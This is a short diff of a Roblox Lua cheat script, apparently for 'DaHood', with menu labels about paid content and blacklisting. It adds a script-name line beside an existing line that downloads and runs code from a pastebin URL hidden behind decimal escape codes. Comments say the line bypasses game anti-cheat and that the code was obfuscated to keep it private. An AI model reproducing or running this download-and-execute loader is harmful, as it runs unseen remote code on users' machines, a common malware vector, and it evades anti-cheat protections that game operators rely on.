@@ -915,5 +915,6 @@ local Paragraph = Tab6:CreateParagraph({Title = "Info", Content = "UI-Origin/Ray
 local Section = Tab6:CreateSection("Script contains paid content")
 local Section = Tab6:CreateSection("Any attempts of cracking or tampering on this script will be immediately penalized with a blacklist")
 local Section = Tab6:CreateSection("Enjoy.")
+getgenv().ScriptName = "DaHood-Enhanced"
 loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\75\85\75\71\69\83\116\105'))()--this bypasses new anti cheat in most hood games
 --if u wonder why this code is so short - it was obfuscated because i dont want my code to get in the wrong hands to be open sourced since this anti cheat is rare
